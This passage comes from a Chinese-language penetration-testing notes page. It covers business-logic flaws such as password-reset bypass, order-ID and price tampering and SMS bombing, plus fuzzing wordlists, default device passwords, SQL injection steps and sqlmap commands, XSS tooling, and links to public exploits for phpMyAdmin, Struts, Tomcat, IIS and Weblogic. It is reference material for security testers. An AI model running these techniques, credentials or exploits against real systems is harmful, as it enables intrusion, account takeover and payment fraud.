- [浅谈绕过waf的数种方法](https://www.waitalone.cn/waf-bypass.html)
- [通过HTTP参数污染绕过WAF拦截](http://www.freebuf.com/articles/web/5908.html)

#### php反序列化
**工具**
- [php在线反序列化工具](https://www.w3cschool.cn/tools/index?name=unserialize)

#### SSRF
**文章**
- [SSRF漏洞分析及利用](https://www.knowsec.net/archives/85/)
- [浅析SSRF原理及利用方式](https://www.anquanke.com/post/id/145519)
- [SSRF利用与防御](https://hellohxk.com/blog/ssrf/)

#### URL跳转漏洞
**文章**
- [URL 重定向及跳转漏洞](http://www.pandan.xyz/2016/11/15/url%20%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/)
- [分享几个绕过URL跳转限制的思路](https://www.anquanke.com/post/id/94377)

---

### 逻辑类

本部分归纳为单独的 [html](./教程/逻辑漏洞.html) 页面

`整个部分结构大部分基于乌云的几篇密码找回、逻辑漏洞类文章，只可惜已经无法访问了，只能在备份里看看`

**文章**
- [密码找回逻辑漏洞总结](http://www.anquan.us/static/drops/web-5048.html)
- [密码找回功能可能存在的问题](http://www.anquan.us/static/drops/papers-287.html)
- [密码找回功能可能存在的问题(补充)](http://www.anquan.us/static/drops/web-3295.html)
- [业务安全漏洞挖掘归纳总结](http://www.anquan.us/static/drops/web-6917.html)
- [应用程序逻辑错误总结](http://www.anquan.us/static/drops/papers-1418.html)
- [在线支付逻辑漏洞总结](http://www.anquan.us/static/drops/papers-345.html)

**资源**
- [web逻辑漏洞挖掘快速入门到放弃](./教程/web逻辑漏洞挖掘快速入门到放弃.docx)

#### 身份认证

**Cookie & Session**
- 会话固定攻击

    利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。
    - 案例：[新浪广东美食后台验证逻辑漏洞，直接登录后台，566764名用户资料暴露](http://www.anquan.us/static/bugs/wooyun-2013-025427.html)

- Cookie仿冒

    修改cookie中的某个参数可以登录其他用户。
    - 案例：[益云广告平台任意帐号登录](http://www.anquan.us/static/bugs/wooyun-2014-051424.html)

**加密测试**
- 前端加密，用密文去后台校验

    这种burp里可以直接进行decode然后爆破

#### 业务一致性
**手机号篡改**

抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。

**邮箱和用户名更改**

抓包修改用户或者邮箱参数为其他用户或者邮箱
- 案例：[绿盟RSAS安全系统全版本通杀权限管理员绕过漏洞，包括最新 RSAS V5.0.13.2](http://www.anquan.us/static/bugs/wooyun-2014-074441.html)

**订单ID更改**

查看自己的订单id，然后修改id(加减一)查看是否能查看其它订单信息。
- 案例：[广之旅旅行社任意访问用户订单](http://www.anquan.us/static/bugs/wooyun-2013-044137.html)

**商品编号更改**

例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换区高积分商品。
- 案例：[联想某积分商城支付漏洞再绕过](http://www.anquan.us/static/bugs/wooyun-2013-041617.html)

**用户ID篡改**

抓包查看自己的用户id，然后修改id(加减1)查看是否能查看其它用户id信息。
- 案例：[拉勾网百万简历泄漏风险(包括手机、邮件、应聘职位等信息、还可冒充企业身份筛选简历、发面试通知等)](http://www.anquan.us/static/bugs/wooyun-2015-0111617.html)

#### 业务数据篡改
**金额数据篡改**

抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。
- 案例：[12308订单支付时的总价未验证漏洞(支付逻辑漏洞)](http://www.anquan.us/static/bugs/wooyun-2015-0117083.html)

- 案例：[UCloud 另一处严重支付逻辑错误 导致可刷余额](http://www.anquan.us/static/bugs/wooyun-2014-048591.html)

- 案例：[destoon无限制增加帐号资金 ](http://www.anquan.us/static/bugs/wooyun-2014-050481.html)

- 案例：[大疆某处支付逻辑漏洞可1元买无人机](http://www.anquan.us/static/bugs/wooyun-2016-0194751.html)

**商品数量篡改**

抓包修改商品数量等字段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。

- 案例：[百脑汇商城支付漏洞](http://www.anquan.us/static/bugs/wooyun-2012-07997.html)

**最大数限制突破**

很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。

**本地js参数修改**

部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。


#### 密码找回漏洞
**用户凭证暴力破解**

像是四位或者六位纯数字的验证码，对验证码进行暴破，未作限制的情况下，很快就会得到结果了
- 案例：[当当网任意用户密码修改漏洞](http://www.anquan.us/static/bugs/wooyun-2012-011833.html)
- 案例：[当当网任意用户密码修改漏洞2](http://www.anquan.us/static/bugs/wooyun-2013-046062.html)
- 案例：[当当网任意用户密码修改漏洞第三次](http://www.anquan.us/static/bugs/wooyun-2013-046999.html)
- 案例：[微信任意用户密码修改漏洞分析](http://www.91ri.org/3969.html)

**返回凭证**
- url返回验证码及token

    不多说，直接输入验证码即可修改密码
    - 案例：[走秀网秀团任意密码修改缺陷](http://www.anquan.us/static/bugs/wooyun-2012-05630.html)

- 密码找回凭证
    - 案例：[sohu邮箱任意用户密码重置](http://www.anquan.us/static/bugs/wooyun-2012-04728.html)

- 返回短信验证码
    - 案例：[新浪某站任意用户密码修改(验证码与取回逻辑设计不当)](http://www.anquan.us/static/bugs/wooyun-2014-085124.html)

**邮箱弱token**
- 时间戳的MD5
    - 案例：[奇虎360任意用户密码修改漏洞](http://www.anquan.us/static/bugs/wooyun-2012-08333.html)

- 服务器时间
    - 案例：[中兴某网站任意用户密码重置漏洞(经典设计缺陷案例) ](http://www.anquan.us/static/bugs/wooyun-2015-090226.html)

**用户凭证有效性**
- 邮箱token
    - 案例：[身份通任意密码修改-泄漏大量公民信息](http://www.anquan.us/static/bugs/wooyun-2012-012572.html)

- 重置密码token
    - 案例：[魅族的账号系统内存在漏洞可导致任意账户的密码重置](http://www.anquan.us/static/bugs/wooyun-2014-078208.html)

**重新绑定**
- 手机绑定
    - 案例：[网易邮箱可直接修改其他用户密码](http://www.anquan.us/static/bugs/wooyun-2012-08307.html)

- 邮箱绑定
    - 案例：[某彩票设计缺陷可修改任意用户密码](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-092319)

**服务器验证**
- 最终提交步骤
    - 案例：[携程旅行网任意老板密码修改](http://www.anquan.us/static/bugs/wooyun-2013-018263.html)

- 服务器验证可控内容
    - 案例：[AA拼车网之任意密码找回2](https://shuimugan.com/bug/view?bug_no=80278)

- 服务器验证验证逻辑为空
    - 案例：[某政企使用邮件系统疑似存在通用设计问题](http://www.anquan.us/static/bugs/wooyun-2014-088927.html)

**用户身份验证**
- 账号与手机号码的绑定
    - 案例：[上海电信通行证任意密码重置](http://www.anquan.us/static/bugs/wooyun-2014-075941.html)

- 账号与邮箱账号的绑定
    - 案例：[和讯网修改任意用户密码漏洞](http://www.anquan.us/static/bugs/wooyun-2015-091216.html)

**找回步骤**
- 跳过验证步骤、找回方式，直接到设置新密码页面
    - 案例：[中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷](http://www.anquan.us/static/bugs/wooyun-2015-098765.html)

**本地验证**
- 在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容。
    - 案例：[oppo重置任意用户密码漏洞(4)](http://www.anquan.us/static/bugs/wooyun-2014-069987.html)

- 发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制。
    - 案例：[OPPO修改任意帐号密码-2](https://shuimugan.com/bug/view?bug_no=20425)

**注入**
- 在找回密码处存在注入漏洞。
    - 案例：[用友人力资源管理软件(e-HR)另一处SQL注入漏洞(通杀所有版本)](http://www.anquan.us/static/bugs/wooyun-2014-068060.html)

**Token生成**
- Token生成可控。
    - 案例：[天天网再一次重置任意账号密码(依旧非暴力)](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095729)

**注册覆盖**
- 注册重复的用户名。
    - 案例：[中铁快运奇葩方式重置任意用户密码(admin用户演示)](http://www.anquan.us/static/bugs/wooyun-2014-088708.html)

**Session覆盖**
- Session覆盖
    - 案例：[聚美优品任意修改用户密码(非爆破)](http://www.anquan.us/static/bugs/wooyun-2014-085843.html)

#### 验证码突破
**验证码暴力破解**
- 使用burp对特定的验证码进行暴力破解
    - 案例： [盟友88电商平台任意用户注册与任意用户密码重置漏洞打包](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-093932)

**验证码时间、次数测试**

抓取携带验证码的数据包不断重复提交，例如：在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。

**验证码客户端回显测试**

当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebug就可看到客户端与服务器进行交互的详细信息。

**验证码绕过测试**

当第一步向第二步跳转时，抓取数据包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。

- 案例：[中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷](http://www.anquan.us/static/bugs/wooyun-2015-098765.html)

**验证码js绕过**

短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二部、第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。

- 案例：[某省公安厅某举报管理系统可JS绕过登陆](http://www.anquan.us/static/bugs/wooyun-2012-07826.html)

#### 业务授权安全
**未授权访问**

非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。

- 案例：[某发电机云控平台未授权访问](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0226920)

**越权测试**

越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。

- 垂直越权(垂直越权是指使用权限低的用户可以访问权限较高的用户)
    - 案例：[中国电信天翼宽带政企网关A8-B垂直越权，可获取最高权限](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0100876)

    - 案例：[如何在Microsoft Translator中越权删除1.3万个项目](https://www.4hou.com/vulnerable/12767.html)

- 水平越权(水平越权是指相同权限的不同用户可以互相访问)
    - 案例：[麦乐购可大批量删除他人购物订单(水平越权一)](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108008)

#### 业务流程乱序
**顺序执行缺陷**
1. 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程。

2. 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。

    - 案例：[中国教师资格网绕过验证(可遍历全国教师身份信息) ](http://www.anquan.us/static/bugs/wooyun-2014-050488.html)

    - 案例：[万达某分站逻辑错误可绕过支付直接获得取票密码](http://www.anquan.us/static/bugs/wooyun-2014-047677.html)

#### 业务接口调用
**重放攻击**

在短信、邮件调用业务或生成业务数据环节中(类：短信验证码，邮件验证码，订单生成，评论提交等)，对其业务环节进行调用(重放)测试。如果业务经过调用(重放)后被多次生成有效的业务或数据结果。

- 恶意注册

- 短信炸弹

    在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信。

    - 案例： [一亩田交易网逻辑漏洞(木桶原理)](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094545)

**内容编辑**

点击“获取短信验证码”，并抓取数据包内容，通过分析数据包，可以发现参数的内容有客户端控制，可以修改为攻击者想要发送的内容

#### 时效绕过

大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。

**时间刷新缺陷**
- 案例：[12306自动刷票时间可更改漏洞](http://www.anquan.us/static/bugs/wooyun-2014-048391.html)

**时间范围测试**

针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。

---

### Fuzz
#### 字典
**字典生成**
- [LandGrey/pydictor](https://github.com/LandGrey/pydictor)
- [crunch](https://sourceforge.net/projects/crunch-wordlist/)
- [RicterZ/genpAss](https://github.com/RicterZ/genpAss)

**字典资源**
- [weakpass](https://weakpass.com/)
- [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- https://downloads.skullsecurity.org/passwords/
- [rootphantomer/Blasting_dictionary](https://github.com/rootphantomer/Blasting_dictionary)
- [H4lo/dictionary](https://github.com/H4lo/dictionary)
- [TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)

**默认设备/服务口令**
- 设备

    很多厂商设备可以在这个网站找到 https://default-password.info/
    ```bash
    群晖
    admin  123456

    锐捷
    ruijie  ruijie

    锐捷ap
    admin/ruijie  apdebug

    FUJI XEROX打印机
    11111 x-admin

    RICOH打印机
    supervisor 密码为空

    X康威视
    admin  初始密码一般设为 12345 123456  888888  admin

    绿盟 RSAS安全系统
    reporter，auditor   密码：nsfocus
    ```

- 服务
    ```bash
    zabbix
    admin zabbix
    ```

---

#### 暴力破解
**工具**
- Burpsuite
- [lijiejie/htpwdScan](https://github.com/lijiejie/htpwdScan)

---

#### SQL
按 SQLMap 中的分类来看，SQL注入类型有以下5种：
```
UNION query SQL injection(可联合查询注入)
Stacked queries SQL injection(可多语句查询注入)
Boolean-based blind SQL injection(布尔型注入)
Error-based SQL injection(报错型注入)
Time-based blind SQL injection(基于时间延迟注入)
```

**SQL 注入常规利用思路**
```
1. 寻找注入点，可以通过 web 扫描工具实现
2. 通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。
3. 猜解关键数据库表及其重要字段与内容(常见如存放管理员账户的表名、字段名等信息)
4. 可以通过获得的用户信息，寻找后台登录。
5. 利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。
```

**手动注入**
- 手工注入思路

    自动化的注入神器 sqlmap 固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入(非盲注)的步骤。
    ```
    1.判断是否存在注入，注入是字符型还是数字型
    2.猜解SQL查询语句中的字段数
    3.确定显示的字段顺序
    4.获取当前数据库
    5.获取数据库中的表
    6.获取表中的字段名
    7.下载数据
    ```

- 显注
    1. 在参数中输入一个单引号 `’`，引起执行查询语句的语法错误，得到服务器的错误回显，从而判断服务器的数据库类型信息。
    2. 根据数据库类型构造sql注入语句。例如一个get方式的url `http://www.xxx.com/abc.asp?p=YY` 修改p的参数值 `http://www.xxx.com/abc.asp?p=YY and user>0 ` ，就可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名。`http://www.xxx.com/abc.asp?p=YY&n … db_name()>0` 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名 。

- 盲注，大部分时候web服务器关闭了错误回显。
    1. `http://www.xxx.com/abc.asp?p=1 and 1=2` sql命令不成立，结果为空或出错 ；
    2. `http://www.xxx.com/abc.asp?p=1 and 1=1` sql命令成立，结果正常返回 。

    两个测试成功后，可以判断负载的sql被执行，存在sql注入漏洞。

**自动注入**
- sqlmap
    ```bash
    sqlmap -u URL	#判断注入
    sqlmap -u URL --current-db	 #获取当前数据库
    sqlmap -u URL -D DATABASE --tables		#获取数据库表
    sqlmap -u URL -D DATABASE -T TABLES --columns	#获取指定表的列名
    sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump		#获取指定表的列名

    sqlmap -r aaa.txt  #post型注入
    sqlmap --cookie="xxxxx" # 带 cookie 注入
    sqlmap --batch # 不要请求用户输入，使用默认行为
    ```

---

#### XSS

**案例**
- [BugBounty：Twitter 蠕虫XSS](https://xz.aliyun.com/t/5050)
- [T00LS帖子正文XSS](https://www.hackersb.cn/hacker/235.html)

**xss 平台**
- **开源平台**
    - [firesunCN/BlueLotus_XSSReceiver](https://github.com/firesunCN/BlueLotus_XSSReceiver)

- **在线平台**
    - http://xssye.com/index.php

**xss 检测环境/靶场**
- **本地靶机**

    **简单版**
    ```php
    <?php
    $input=$_GET["parm"];
    echo "<div>".$input."</div>";
    ?>
    ```
    然后访问 xxx.xxx.xxx.xxx/1.php?parm= 加上你的xss代码

    **进阶版**
    - [xss练习源码](./文件/xss练习源码.zip)
    - [XSS通关小游戏以及我的挑战思路分享](https://bbs.ichunqiu.com/thread-15664-1-1.html)

    **在线版**
    - http://demo.testfire.net/
    - https://juice-shop.herokuapp.com/#/search

**笔记**
- [xss笔记](./笔记/xss笔记.md)

**文章**
- [XSS插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [XSS总结](https://xz.aliyun.com/t/4067)
- [WAF的XSS绕过姿势](https://www.freebuf.com/articles/web/81959.html)
- [他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)
- [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
- [深入理解浏览器解析机制和XSS向量编码](http://bobao.360.cn/learning/detail/292.html)
- [csp与bypass的探讨(译文)](http://wutongyu.info/csp-2015/)

**工具**
- [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
    - 依赖
        ```bash
        pip3 install -r requirements.txt

        wget https://github.com/mozilla/geckodriver/releases/download/v0.24.0/geckodriver-v0.24.0-linux64.tar.gz
        mkdir /usr/local/temp
        mv geckodriver /usr/local/temp
        PATH=$PATH:/usr/local/temp/
        ```

    - **[Usage](https://github.com/s0md3v/XSStrike/wiki/Usage#scan-a-single-url)**
        ```bash
        python3 xsstrike.py -u "http://example.com/search.php?q=query"
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer
        python3 xsstrike.py -u "http://example.com/search.php?q=query" --crawl
        ```

**payload**
- [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)

**tips**
- **Firefox 关闭 xss 过滤器**

    about:config 把 rowser.urlbar.filter.javascript 改为 false

- **chrome 关闭 xss 过滤器**

    带参数启动 --args --disable-xss-auditor

#### XXE

**文章**
- [浅谈XXE攻击 - FreeBuf互联网安全新媒体平台](https://www.freebuf.com/articles/web/126788.html)

---

### vul
#### 各类论坛/CMS/框架

**工具**
- [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter)
- [Q2h1Cg/CMS-Exploit-Framework](https://github.com/Q2h1Cg/CMS-Exploit-Framework)
- [Lucifer1993/AngelSword](https://github.com/Lucifer1993/AngelSword)

**[phpMyAdmin](https://www.phpmyadmin.net/)**
- **LOAD DATA INFILE 任意文件读取漏洞**
    - POC | Payload | exp
        [Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)
        ```vim
        vim rogue_mysql_server.py

        PORT = 3307
        ```
        `python rogue_mysql_server.py`

        打开目标phpMyAdmin的登录页面，地址输入db:3307、用户名、密码，提交登录。
        回到db的终端，如果文件读取成功会将文件内容记录到mysql.log文件中

- **4.8.x 本地文件包含漏洞利用**

    [phpMyAdmin 4.8.x 本地文件包含漏洞利用 | Vulnspy Blog](http://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/)
    可以通过这个线上靶场实验,不过docker镜像可能有点问题,mysql进程起不起来,我的解决方式是直接卸了重装mysql-server,而且他默认的apt源无法访问,还要换一下apt源

**[YxCMS](http://www.yxcms.net/index.html)**
- **常见路径**
    ```
    /index.php?r=admin  # 后台  默认管理员账号密码 admin 123456
    ```

- **YxCMS 1.4.7 多个漏洞**
    - 文章
        - [YxCMS 1.4.7 最新版漏洞分析](https://bbs.ichunqiu.com/thread-45926-1-1.html)

#### 应用程序
##### 编辑器

**手册**
- [编辑器漏洞手册](https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/)

**ewebeditor**
- 文章
    - [ewebeditor编辑器漏洞总结](https://www.0dayhack.com/post-426.html)

- 常用路径
    ```
    Admin_Login.asp 登录页面
    Admin_Default.asp 管理首页
    Admin_Style.asp
    Admin_UploadFile.asp
    Upload.asp
    Admin_ModiPwd.asp
    eWebEditor.asp
    db/ewebeditor.mdb 默认数据库路径
    ewebeditor/login_admin.asp
    eweb/login_admin.asp
    editor/login_admin.asp
    ```

**FCKeditor**
- 文章
    - [Fckeditor上传漏洞利用拿shell总结](https://www.0dayhack.com/post-413.html)

- 常用路径
    ```
    FCKeditor/_samples/default.html   查看编辑器版本
    FCKeditor/_whatsnew.html
    fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
    FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.test.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php
    FCKeditor/_samples/asp/sample01.asp
    FCKeditor/_samples/asp/sample02.asp
    FCKeditor/_samples/asp/sample03.asp
    FCKeditor/_samples/asp/sample04.asp
    ```

**kindeditor**
- **kindeditor<=4.1.5上传漏洞**
    - 文章
        - [kindeditor<=4.1.5上传漏洞复现](https://www.cnblogs.com/backlion/p/10421405.html)

    - 漏洞修复
        1. 直接删除upload_json.*和file_manager_json.*
        2. 升级kindeditor到最新版本

#### 中间件

**文章**
- [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)

**Apache**
- **CVE-2017-9798** Optionsbleed 服务器内存信息泄漏漏洞
    - 文章
        - [Optionsbleed 漏洞泄露 Apache Server 的内存信息](https://www.freebuf.com/vuls/148525.html)

    - POC | Payload | exp
        - [hannob/optionsbleed](https://github.com/hannob/optionsbleed)

**[Apache Struts](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)**
- **工具**
    - [Lucifer1993/struts-scan](https://github.com/Lucifer1993/struts-scan) - Python2 编写的struts2漏洞全版本检测和利用工具
    - [HatBoy/Struts2-Scan](https://github.com/HatBoy/Struts2-Scan) - Python3 Struts2全漏洞扫描利用工具

- **环境收集**
    - [wh1t3p1g/Struts2Environment](https://github.com/wh1t3p1g/Struts2Environment)
    - [sie504/Struts-S2-xxx](https://github.com/sie504/Struts-S2-xxx)
    - [https://github.com/shengqi158/S2-055-PoC](https://github.com/shengqi158/S2-055-PoC)

- **文章**
    - [Struts2 历史 RCE 漏洞回顾不完全系列](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/)

- **S2-020 & CVE-2014-0094 & CNNVD-201403-191**

- **S2-045 & CVE-2017-5638**
    - POC | Payload | exp
        - [tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)
        - [iBearcat/S2-045](https://github.com/iBearcat/S2-045)

- **S2-046 & CVE-2017-5638**

    - 简介

        该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息，导致远程攻击者可通过修改HTTP请求头中的Content-Type值，构造发送恶意的数据包，利用该漏洞进而在受影响服务器上执行任意系统命令。

    - 修复方案
        1. 官方已经发布版本更新，尽快升级到不受影响的版本(Struts 2.3.32或Struts 2.5.10.1)，建议在升级前做好数据备份。
        2. 临时修复方案
        在用户不便进行升级的情况下，作为临时的解决方案，用户可以进行以下操作来规避风险：在WEB-INF/classes目录下的struts.xml 中的struts 标签下添加
        `<constant name="struts.custom.i18n.resources" value="global" />`
        在WEB-INF/classes/ 目录下添加 global.properties，文件内容如下：
        `struts.messages.upload.error.InvalidContentTypeException=1`

    - POC | Payload | exp
        - [mazen160/struts-pwn](https://github.com/mazen160/struts-pwn)

- **S2-048 & CVE-2017-9791**
    - POC | Payload | exp
        - [dragoneeg/Struts2-048](https://github.com/dragoneeg/Struts2-048)

- **S2-052 & CVE-2017-9805**
    - POC | Payload | exp
        - [mazen160/struts-pwn_CVE-2017-9805](https://github.com/mazen160/struts-pwn_CVE-2017-9805)

- **S2-053 & CVE-2017-12611**
    - POC | Payload | exp
        - [brianwrf/S2-053-CVE-2017-12611](https://github.com/brianwrf/S2-053-CVE-2017-12611)

- **S2-055 & CVE-2017-7525**
    - POC | Payload | exp
        - [iBearcat/S2-055](https://github.com/iBearcat/S2-055)

- **S2-056 & CVE-2018-1327**
    - POC | Payload | exp
        - [ iBearcat/S2-056-XStream](https://github.com/iBearcat/S2-056-XStream)

- **S2-057 & CVE-2018-11776**

    - 简介

        该漏洞由Semmle Security Research team的安全研究员Man YueMo发现。该漏洞是由于在Struts2开发框架中使用namespace功能定义XML配置时，namespace值未被设置且在上层动作配置(Action Configuration)中未设置或用通配符namespace，可能导致远程代码执行。

    - POC | Payload | exp
        - [Ivan1ee/struts2-057-exp](https://github.com/Ivan1ee/struts2-057-exp)

**Apache Tomcat**
- **文章**
    - [Tomcat漏洞详解](http://www.mottoin.com/detail/389.html)

- **CVE-2017-12615**
    - 文章
        - [CVE-2017-12615/CVE-2017-12616:Tomcat信息泄漏和远程代码执行漏洞分析报告](https://paper.seebug.org/399/)

    - POC | Payload | exp
        - [iBearcat/CVE-2017-12615](https://github.com/iBearcat/CVE-2017-12615)
        - [breaktoprotect/CVE-2017-12615](https://github.com/breaktoprotect/CVE-2017-12615)

- **CVE-2017-12617**
    - 文章
        - [CVE-2017-12617-Tomcat远程代码执行漏洞复现测试](https://www.freebuf.com/vuls/150203.html)

    - POC | Payload | exp
        - [cyberheartmi9/CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)

    - msf模块
        ```
        use exploit/multi/http/tomcat_jsp_upload_bypass
        ```

- **CVE-2019-0232**
    - 文章
        - [CVE-2019-0232：Apache Tomcat RCE漏洞分析](https://xz.aliyun.com/t/4875)

    - POC | Payload | exp
        - [pyn3rd/CVE-2019-0232](https://github.com/pyn3rd/CVE-2019-0232)
        - [jas502n/CVE-2019-0232](https://github.com/jas502n/CVE-2019-0232)

**IIS**
- **IIS shortname**

    windows在创建一个新文件时，操作系统还会生成 8.3 格式的兼容 MS-DOS 的(短)文件名，以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。

    - 文章
        - [IIS短文件名漏洞](http://www.lonelyor.org/lonelyorWiki/15446866501207.html)
        - [IIS短文件名泄露漏洞修复](https://segmentfault.com/a/1190000006225568)
        - [IIS短文件/文件夹漏洞(汇总整理) ](https://www.freebuf.com/articles/4908.html)

    - 修复方案
        1. 升级 .net framework 至 4.0 版本或以上
        2. 修改HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 修改NtfsDisable8dot3NameCreation为1

    - 示例
        ```bash
        dir /x
        1. http://www.xxx.com/*~1*/.aspx
        2. http://www.xxx.com/l1j1e*~1*/.aspx
        #若1返回404而2返回400，则可以判断目标站点存在漏洞。
        http://www.xxx.com/a*~1*/.aspx
        #若存在将返回404，不存在则返回400。以此类推，不断向下猜解所有的6个字符。
        ```

    - POC | Payload | exp
        - [lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)
        - [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

- **.Net Framework 拒绝服务攻击**

    当请求文件夹名称包含 ~1 的请求，会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的，当“~1”大于一个，比如像这样：
    `/wwwtest/fuck~1/~1/~1/~1.aspx`
    此时文件系统会这样调用：
    ```
    \wwwtest                           SUCCESS
    \wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest\fuck~1\~1\                PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1                 PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest                           SUCCESS
    \wwwtest                           SUCCESS
    ```
    如果我们请求的文件/文件夹名同时存在大小写时，这个请求会被请求两次，一次是原封不动的请求，一次是全部使用小写的请求。

    下表显示了每个请求的FS调用的数量(Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同))
    ![image](../../img/渗透/1.jpg)

**Weblogic**
- **工具**
    - [dr0op/WeblogicScan](https://github.com/dr0op/WeblogicScan)

- **文章**
    - [利用Weblogic进行入侵的一些总结](http://drops.xmd5.com/static/drops/tips-8321.html)

- **CVE-2009-1975**
    - POC | Payload | exp
        - [Oracle WebLogic Server 10.3 - 'console-help.portal' Cross-Site Scripting](https://www.exploit-db.com/exploits/33079)

    - 示例

        `http://www.example.com:7011/consolehelp/console-help.portal?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery="><script>alert('DSECRG')</script> `

- **CVE-2017-10271**
    - 文章
        - [WebLogic XMLDecoder反序列化漏洞复现](https://mochazz.github.io/2017/12/25/weblogic_xmldecode/)
